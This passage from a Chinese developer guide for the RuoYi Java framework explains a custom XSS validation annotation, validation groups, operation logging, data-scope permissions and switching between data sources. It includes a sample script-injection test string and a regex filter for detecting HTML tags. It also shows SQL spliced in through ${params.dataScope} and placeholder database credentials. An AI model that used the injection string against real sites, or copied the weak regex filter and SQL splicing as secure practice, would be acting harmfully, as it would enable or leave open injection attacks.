<span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span>METHOD<span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span>FIELD<span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span>CONSTRUCTOR<span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span>PARAMETER <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Constraint</span><span class="token punctuation">(</span>validatedBy <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> <span class="token class-name">XssValidator</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">Xss</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token class-name">String</span> <span class="token function">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">default</span> <span class="token string">"不允许任何脚本运行"</span><span class="token punctuation">;</span>

    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">groups</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">Payload</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>2、自定义<code>Xss</code>校验器，实现<code>ConstraintValidator</code>接口。</p>
<pre><code class="prism language-java"><span class="token comment">/**
 * 自定义xss校验注解实现
 * 
 * @author ruoyi
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">XssValidator</span> <span class="token keyword">implements</span> <span class="token class-name">ConstraintValidator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Xss</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> HTML_PATTERN <span class="token operator">=</span> <span class="token string">"&lt;(\\S*?)[^&gt;]*&gt;.*?|&lt;.*? /&gt;"</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isValid</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">,</span> <span class="token class-name">ConstraintValidatorContext</span> constraintValidatorContext<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">containsHtml</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">containsHtml</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">Pattern</span> pattern <span class="token operator">=</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>HTML_PATTERN<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Matcher</span> matcher <span class="token operator">=</span> pattern<span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> matcher<span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>3、实体类使用自定义的<code>@Xss</code>注解</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Xss</span><span class="token punctuation">(</span>message <span class="token operator">=</span> <span class="token string">"登录账号不能包含脚本字符"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@NotBlank</span><span class="token punctuation">(</span>message <span class="token operator">=</span> <span class="token string">"登录账号不能为空"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Size</span><span class="token punctuation">(</span>min <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> max <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">,</span> message <span class="token operator">=</span> <span class="token string">"登录账号长度不能超过30个字符"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getLoginName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> loginName<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>此时在去保存会进行验证，如果不符合规则的字符（例如<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>）会提示<code>登录账号不能包含脚本字符</code>，代表限制成功。</p>
<p>如果是在方法里面校验整个实体，参考示例。</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Autowired</span>
<span class="token keyword">protected</span> <span class="token class-name">Validator</span> validator<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">importUser</span><span class="token punctuation">(</span><span class="token class-name">SysUser</span> user<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token class-name">BeanValidators</span><span class="token punctuation">.</span><span class="token function">validateWithException</span><span class="token punctuation">(</span>validator<span class="token punctuation">,</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h3><a id="4_2464"></a>4、自定义分组校验</h3>
<p>有时候我们为了在使用实体类的情况下更好的区分出新增、修改和其他操作验证的不同，可以通过<code>groups</code>属性设置。使用方式如下</p>
<p><strong>新增类接口，用于标识出不同的操作类型</strong></p>
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Add</span>
<span class="token punctuation">{<!-- --></span>
<span class="token punctuation">}</span>

<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Edit</span>
<span class="token punctuation">{<!-- --></span>
<span class="token punctuation">}</span>
</code></pre>
<p><strong>Controller.java</strong></p>
<pre><code class="prism language-java"><span class="token comment">// 新增</span>
<span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">addSave</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Validated</span><span class="token punctuation">(</span><span class="token class-name">Add</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">Xxxx</span> xxxx<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> <span class="token function">success</span><span class="token punctuation">(</span>xxxx<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// 编辑</span>
<span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">editSave</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Validated</span><span class="token punctuation">(</span><span class="token class-name">Edit</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">Xxxx</span> xxxx<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> <span class="token function">success</span><span class="token punctuation">(</span>xxxx<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><strong>Model.java</strong></p>
<pre><code class="prism language-java"><span class="token comment">// 仅在新增时验证</span>
<span class="token annotation punctuation">@NotNull</span><span class="token punctuation">(</span>message <span class="token operator">=</span> <span class="token string">"不能为空"</span><span class="token punctuation">,</span> groups <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token class-name">Add</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">private</span> <span class="token class-name">String</span> xxxx<span class="token punctuation">;</span>

<span class="token comment">// 在新增和修改时验证</span>
<span class="token annotation punctuation">@NotBlank</span><span class="token punctuation">(</span>message <span class="token operator">=</span> <span class="token string">"不能为空"</span><span class="token punctuation">,</span> groups <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token class-name">Add</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Edit</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">private</span> <span class="token class-name">String</span> xxxx<span class="token punctuation">;</span>
</code></pre>
<p>提示</p>
<p>如果你有更多操作类型，也可以自定义类统一管理，使用方式就变成了<code>Type.Add</code>、<code>Type.Edit</code>、<code>Type.Xxxx</code>等。</p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>eva<span class="token punctuation">.</span>core<span class="token punctuation">.</span>constants</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 操作类型
 */</span>
<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Type</span> 
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">interface</span> <span class="token class-name">Add</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>

    <span class="token keyword">interface</span> <span class="token class-name">Edit</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>

    <span class="token keyword">interface</span> <span class="token class-name">Xxxx</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<h2><a id="_2528"></a>十三、系统日志</h2>
<p>在实际开发中，对于某些关键业务，我们通常需要记录该操作的内容，一个操作调一次记录方法，每次还得去收集参数等等，会造成大量代码重复。 我们希望代码中只有业务相关的操作，在项目中使用注解来完成此项功能。</p>
<p>在需要被记录日志的<code>controller</code>方法上添加<code>@Log</code>注解，使用方法如下：</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Log</span><span class="token punctuation">(</span>title <span class="token operator">=</span> <span class="token string">"用户管理"</span><span class="token punctuation">,</span> businessType <span class="token operator">=</span> <span class="token class-name">BusinessType</span><span class="token punctuation">.</span>INSERT<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">addSave</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h3><a id="1_2542"></a>1、注解参数说明</h3>
<table><thead><tr><th>参数</th><th>类型</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td>String</td><td>空</td><td>操作模块</td></tr><tr><td>businessType</td><td>BusinessType</td><td>OTHER</td><td>操作功能（<code>OTHER</code>其他、<code>INSERT</code>新增、<code>UPDATE</code>修改、<code>DELETE</code>删除、<code>GRANT</code>授权、<code>EXPORT</code>导出、<code>IMPORT</code>导入、<code>FORCE</code>强退、<code>GENCODE</code>生成代码、<code>CLEAN</code>清空数据）</td></tr><tr><td>operatorType</td><td>OperatorType</td><td>MANAGE</td><td>操作人类别（<code>OTHER</code>其他、<code>MANAGE</code>后台用户、<code>MOBILE</code>手机端用户）</td></tr><tr><td>isSaveRequestData</td><td>boolean</td><td>true</td><td>是否保存请求的参数</td></tr><tr><td>isSaveResponseData</td><td>boolean</td><td>true</td><td>是否保存响应的参数</td></tr></tbody></table>
<h3><a id="2_2552"></a>2、自定义操作功能</h3>
<p>1、在<code>BusinessType</code>中新增业务操作类型如:</p>
<pre><code class="prism language-java"><span class="token comment">/**
 * 测试
 */</span>
TEST<span class="token punctuation">,</span>
</code></pre>
<p>2、在<code>sys_dict_data</code>字典数据表中初始化操作业务类型</p>
<pre><code class="prism language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> sys_dict_data <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token string">'测试'</span><span class="token punctuation">,</span>     <span class="token string">'10'</span><span class="token punctuation">,</span> <span class="token string">'sys_oper_type'</span><span class="token punctuation">,</span>       <span class="token string">''</span><span class="token punctuation">,</span>   <span class="token string">'primary'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'2018-03-16 11-33-00'</span><span class="token punctuation">,</span> <span class="token string">'ry'</span><span class="token punctuation">,</span> <span class="token string">'2018-03-16 11-33-00'</span><span class="token punctuation">,</span> <span class="token string">'测试操作'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>3、在<code>Controller</code>中使用注解</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Log</span><span class="token punctuation">(</span>title <span class="token operator">=</span> <span class="token string">"测试标题"</span><span class="token punctuation">,</span> businessType <span class="token operator">=</span> <span class="token class-name">BusinessType</span><span class="token punctuation">.</span>TEST<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>操作日志记录逻辑实现代码<a href="https://gitee.com/y_project/RuoYi/blob/master/ruoyi-framework/src/main/java/com/ruoyi/framework/aspectj/LogAspect.java">LogAspect.java(opens new window)</a><br/> 登录系统（系统管理-操作日志）可以查询操作日志列表和详细信息。</p>
<h2><a id="_2582"></a>十四、数据权限</h2>
<p>在实际开发中，需要设置用户只能查看哪些部门的数据，这种情况一般称为数据权限。<br/> 例如对于销售，财务的数据，它们是非常敏感的，因此要求对数据权限进行控制， 对于基于集团性的应用系统而言，就更多需要控制好各自公司的数据了。如设置只能看本公司、或者本部门的数据，对于特殊的领导，可能需要跨部门的数据， 因此程序不能硬编码那个领导该访问哪些数据，需要进行后台的权限和数据权限的控制。</p>
<p>提示</p>
<p>默认系统管理员<code>admin</code>拥有所有数据权限<code>（userId=1）</code>，默认角色拥有所有数据权限（如不需要数据权限不用设置数据权限操作）</p>
<h3><a id="1_2591"></a>1、注解参数说明</h3>
<table><thead><tr><th>参数</th><th>类型</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>deptAlias</td><td>String</td><td>空</td><td>部门表的别名</td></tr><tr><td>userAlias</td><td>String</td><td>空</td><td>用户表的别名</td></tr></tbody></table>
<h3><a id="2_2598"></a>2、数据权限使用</h3>
<p>1、在（系统管理-角色管理）设置需要数据权限的角色 目前支持以下几种权限</p>
<ul><li>全部数据权限</li><li>自定数据权限</li><li>部门数据权限</li><li>部门及以下数据权限</li><li>仅本人数据权限</li></ul>
<p>2、在需要数据权限控制方法上添加<code>@DataScope</code>注解，其中<code>d</code>和<code>u</code>用来表示表的别名</p>
<p><strong>部门数据权限注解</strong></p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@DataScope</span><span class="token punctuation">(</span>deptAlias <span class="token operator">=</span> <span class="token string">"d"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&gt;</span></span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> mapper<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><strong>部门及用户权限注解</strong></p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@DataScope</span><span class="token punctuation">(</span>deptAlias <span class="token operator">=</span> <span class="token string">"d"</span><span class="token punctuation">,</span> userAlias <span class="token operator">=</span> <span class="token string">"u"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&gt;</span></span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> mapper<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>3、在<code>mybatis</code>查询底部标签添加数据范围过滤</p>
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>select<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>...<span class="token punctuation">"</span></span> <span class="token attr-name">resultMap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>...Result<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>include</span> <span class="token attr-name">refid</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>select...Vo<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
    <span class="token comment">&lt;!-- 数据范围过滤 --&gt;</span>
    ${params.dataScope}
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>例如：用户管理（未过滤数据权限的情况）：</p>
<pre><code class="prism language-sql"><span class="token keyword">select</span> u<span class="token punctuation">.</span>user_id<span class="token punctuation">,</span> u<span class="token punctuation">.</span>dept_id<span class="token punctuation">,</span> u<span class="token punctuation">.</span>login_name<span class="token punctuation">,</span> u<span class="token punctuation">.</span>user_name<span class="token punctuation">,</span> u<span class="token punctuation">.</span>email
	<span class="token punctuation">,</span> u<span class="token punctuation">.</span>phonenumber<span class="token punctuation">,</span> u<span class="token punctuation">.</span>password<span class="token punctuation">,</span> u<span class="token punctuation">.</span>sex<span class="token punctuation">,</span> u<span class="token punctuation">.</span>avatar<span class="token punctuation">,</span> u<span class="token punctuation">.</span>salt
	<span class="token punctuation">,</span> u<span class="token punctuation">.</span><span class="token keyword">status</span><span class="token punctuation">,</span> u<span class="token punctuation">.</span>del_flag<span class="token punctuation">,</span> u<span class="token punctuation">.</span>login_ip<span class="token punctuation">,</span> u<span class="token punctuation">.</span>login_date<span class="token punctuation">,</span> u<span class="token punctuation">.</span>create_by
	<span class="token punctuation">,</span> u<span class="token punctuation">.</span>create_time<span class="token punctuation">,</span> u<span class="token punctuation">.</span>remark<span class="token punctuation">,</span> d<span class="token punctuation">.</span>dept_name
<span class="token keyword">from</span> sys_user u
	<span class="token keyword">left</span> <span class="token keyword">join</span> sys_dept d <span class="token keyword">on</span> u<span class="token punctuation">.</span>dept_id <span class="token operator">=</span> d<span class="token punctuation">.</span>dept_id
<span class="token keyword">where</span> u<span class="token punctuation">.</span>del_flag <span class="token operator">=</span> <span class="token string">'0'</span>
</code></pre>
<p>例如：用户管理（已过滤数据权限的情况）：</p>
<pre><code class="prism language-sql"><span class="token keyword">select</span> u<span class="token punctuation">.</span>user_id<span class="token punctuation">,</span> u<span class="token punctuation">.</span>dept_id<span class="token punctuation">,</span> u<span class="token punctuation">.</span>login_name<span class="token punctuation">,</span> u<span class="token punctuation">.</span>user_name<span class="token punctuation">,</span> u<span class="token punctuation">.</span>email
	<span class="token punctuation">,</span> u<span class="token punctuation">.</span>phonenumber<span class="token punctuation">,</span> u<span class="token punctuation">.</span>password<span class="token punctuation">,</span> u<span class="token punctuation">.</span>sex<span class="token punctuation">,</span> u<span class="token punctuation">.</span>avatar<span class="token punctuation">,</span> u<span class="token punctuation">.</span>salt
	<span class="token punctuation">,</span> u<span class="token punctuation">.</span><span class="token keyword">status</span><span class="token punctuation">,</span> u<span class="token punctuation">.</span>del_flag<span class="token punctuation">,</span> u<span class="token punctuation">.</span>login_ip<span class="token punctuation">,</span> u<span class="token punctuation">.</span>login_date<span class="token punctuation">,</span> u<span class="token punctuation">.</span>create_by
	<span class="token punctuation">,</span> u<span class="token punctuation">.</span>create_time<span class="token punctuation">,</span> u<span class="token punctuation">.</span>remark<span class="token punctuation">,</span> d<span class="token punctuation">.</span>dept_name
<span class="token keyword">from</span> sys_user u
	<span class="token keyword">left</span> <span class="token keyword">join</span> sys_dept d <span class="token keyword">on</span> u<span class="token punctuation">.</span>dept_id <span class="token operator">=</span> d<span class="token punctuation">.</span>dept_id
<span class="token keyword">where</span> u<span class="token punctuation">.</span>del_flag <span class="token operator">=</span> <span class="token string">'0'</span>
	<span class="token operator">and</span> u<span class="token punctuation">.</span>dept_id <span class="token operator">in</span> <span class="token punctuation">(</span>
		<span class="token keyword">select</span> dept_id
		<span class="token keyword">from</span> sys_role_dept
		<span class="token keyword">where</span> role_id <span class="token operator">=</span> <span class="token number">2</span>
	<span class="token punctuation">)</span>
</code></pre>
<p>结果很明显，我们多了如下语句。通过角色部门表<code>（sys_role_dept）</code>完成了数据权限过滤</p>
<pre><code class="prism language-sql"><span class="token operator">and</span> u<span class="token punctuation">.</span>dept_id <span class="token operator">in</span> <span class="token punctuation">(</span>
	<span class="token keyword">select</span> dept_id
	<span class="token keyword">from</span> sys_role_dept
	<span class="token keyword">where</span> role_id <span class="token operator">=</span> <span class="token number">2</span>
<span class="token punctuation">)</span>
</code></pre>
<p>逻辑实现代码 <code>com.ruoyi.framework.aspectj.DataScopeAspect</code></p>
<p>提示</p>
<p>仅实体继承<code>BaseEntity</code>才会进行处理，<code>SQL</code>语句会存放到<code>BaseEntity</code>对象中的<code>params</code>属性中，然后在<code>xml</code>中通过<code>${params.dataScope}</code>获取拼接后的语句。</p>
<h2><a id="_2685"></a>十五、多数据源</h2>
<p>在实际开发中，经常可能遇到在一个应用中可能需要访问多个数据库的情况，在项目中使用注解来完成此项功能。</p>
<p>在需要被切换数据源的<code>Service</code>或<code>Mapper</code>方法上添加<code>@DataSource</code>注解，使用方法如下：</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@DataSource</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token class-name">DataSourceType</span><span class="token punctuation">.</span>MASTER<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&gt;</span></span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> mapper<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>其中<code>value</code>用来表示数据源名称，除<code>MASTER</code>和<code>SLAVE</code>其他均需要进行配置。</p>
<h3><a id="1_2709"></a>1、注解参数说明</h3>
<table><thead><tr><th>参数</th><th>类型</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>value</td><td>DataSourceType</td><td>DataSourceType.MASTER</td><td>主库</td></tr></tbody></table>
<h3><a id="2_2715"></a>2、多数据源使用</h3>
<p>1、在<code>application-druid.yml</code>配置从库数据源</p>
<pre><code class="prism language-yml"><span class="token comment"># 从库数据源</span>
<span class="token key atrule">slave</span><span class="token punctuation">:</span>
	<span class="token comment"># 从数据源开关/默认关闭</span>
	<span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
	<span class="token key atrule">url</span><span class="token punctuation">:</span> jdbc<span class="token punctuation">:</span>mysql<span class="token punctuation">:</span>//localhost<span class="token punctuation">:</span>3306/test<span class="token punctuation">?</span>useUnicode=true<span class="token important">&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8</span>
	<span class="token key atrule">username</span><span class="token punctuation">:</span> root
	<span class="token key atrule">password</span><span class="token punctuation">:</span> password
</code></pre>
<p>2、在<code>DataSourceType</code>类添加数据源枚举</p>
<pre><code class="prism language-java"><span class="token comment">/**
 * 从库
 */</span>
SLAVE
</code></pre>
<p>3、在<code>DruidConfig</code>配置读取数据源</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Bean</span>
<span class="token annotation punctuation">@ConfigurationProperties</span><span class="token punctuation">(</span><span class="token string">"spring.datasource.druid.slave"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@ConditionalOnProperty</span><span class="token punctuation">(</span>prefix <span class="token operator">=</span> <span class="token string">"spring.datasource.druid.slave"</span><span class="token punctuation">,</span> name <span class="token operator">=</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span> havingValue <span class="token operator">=</span> <span class="token string">"true"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">DataSource</span> <span class="token function">slaveDataSource</span><span class="token punctuation">(</span><span class="token class-name">DruidProperties</span> druidProperties<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token class-name">DruidDataSource</span> dataSource <span class="token operator">=</span> <span class="token class-name">DruidDataSourceBuilder</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> druidProperties<span class="token punctuation">.</span><span class="token function">dataSource</span><span class="token punctuation">(</span>dataSource<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>4、在<code>DruidConfig</code>类<code>dataSource</code>方法添加数据源</p>
<pre><code class="prism language-java"><span class="token function">setDataSource</span><span class="token punctuation">(</span>targetDataSources<span class="token punctuation">,</span> <span class="token class-name">DataSourceType</span><span class="token punctuation">.</span>SLAVE<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"slaveDataSource"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>5、在需要使用多数据源方法或类上添加<code>@DataSource</code>注解，其中<code>value</code>用来表示数据源</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@DataSource</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token class-name">DataSourceType</span><span class="token punctuation">.</span>SLAVE<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysUser</span><span class="token punctuation">&gt;</span></span> <span class="token function">selectUserList</span><span class="token punctuation">(</span><span class="token class-name">SysUser</span> user<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> userMapper<span class="token punctuation">.</span><span class="token function">selectUserList</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Service</span>
<span class="token annotation punctuation">@DataSource</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token class-name">DataSourceType</span><span class="token punctuation">.</span>SLAVE<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SysUserServiceImpl</span>
</code></pre>
<h3><a id="3_2773"></a>3、手动切换数据源</h3>
<p>在需要切换数据源的方法中使用<code>DynamicDataSourceContextHolder</code>类实现手动切换，使用方法如下：</p>
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysUser</span><span class="token punctuation">&gt;</span></span> <span class="token function">selectUserList</span><span class="token punctuation">(</span><span class="token class-name">SysUser</span> user<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
